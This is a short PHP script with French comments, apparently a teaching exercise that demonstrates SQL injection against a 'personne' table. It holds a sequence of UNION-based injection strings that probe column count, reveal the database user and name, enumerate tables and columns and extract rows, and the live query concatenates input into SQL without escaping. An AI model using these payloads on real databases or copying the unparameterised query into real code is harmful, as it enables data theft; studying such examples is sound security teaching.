<?php
// $recupClient = "MAN' ORDER BY 3 #";
// $recupClient = "MAN' UNION SELECT user(), database() #";
// $recupClient = "MAN' UNION SELECT null, table_name FROM information_schema.tables #";
// $recupClient = "MAN' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name LIKE 'langue'#";
$recupClient = "MAN' UNION SELECT id, Libelle FROM langue #";
// récupération des information provenant de la Base
$sqlSelect = "SELECT Nom, Prenom FROM personne WHERE Nom LIKE '$recupClient'";
$resultat = mysqli_query($connexion, $sqlSelect);
if($resultat){
    // retourne le nombre d'entrée dans la base
    echo "Nombre de personnes : ".mysqli_num_rows($resultat).BR;
}else{
    echo "Echec de l'exécution de la requête.".HR;
}

// while($ligne = mysqli_fetch_assoc($resultat)){
//     // retourne les inormations de la base
//     echo "Nom : ".$ligne['Nom']." Prenom : ".$ligne['Prenom'].BR;
//     echo PREO;
//     var_dump($ligne);
//     echo PREC;
// }

while($object = mysqli_fetch_object($resultat)){
    echo "Nom : ".strtoupper($object->Nom)." Prénom : $object->Prenom".BR;
}